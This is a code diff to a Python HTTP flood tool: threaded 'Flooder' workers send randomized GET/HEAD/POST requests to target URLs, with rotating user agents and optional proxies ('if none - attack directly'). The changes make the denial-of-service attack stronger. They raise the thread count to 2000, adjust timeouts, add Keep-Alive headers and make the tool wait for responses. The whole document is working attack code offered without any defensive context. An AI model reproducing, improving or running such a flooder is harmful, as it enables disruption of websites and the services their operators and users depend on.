@@ -10,16 +10,18 @@ import string
 
 # TODO вынести это в config.txt
 referrer = ""
-request_methods = ["GET", "HEAD", "POST"]
-thread_limit = 1500
+request_methods = ["HEAD", "GET", "POST"]
+thread_limit = 2000
 append_rand_string_to_url = False
-min_timeout = 20
+min_timeout = 30
 max_timeout = 30
+wait_for_response = True
+
 # Global variables
 user_agents = []  # in file 'useragents.txt'
 proxies = []  # in file 'proxies.txt' if none - attack directly
 url = []  # from file 'urls.txt' or enter manually
-# Global parameters end
+# Global variables end
 
 
 class Flooder(threading.Thread):
@@ -39,13 +41,16 @@ class Flooder(threading.Thread):
                 cur_header = {
                     "User-agent": random.choice(user_agents),
                     "Referrer": referrer,
-                    "Accept-Encoding": "gzip,deflate"
+                    "Accept-Encoding": "gzip,deflate",
+                    "Connection": "Keep-Alive"
                 }
                 if not append_rand_string_to_url:
                     connection.request(method=random.choice(request_methods), url=url_str, headers=cur_header)
                 else:
                     randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                     connection.request(method=random.choice(request_methods), url=url_str + randstr, headers=cur_header)
+                if wait_for_response:
+                    connection.getresponse()
         except:
             sys.exit()
             pass
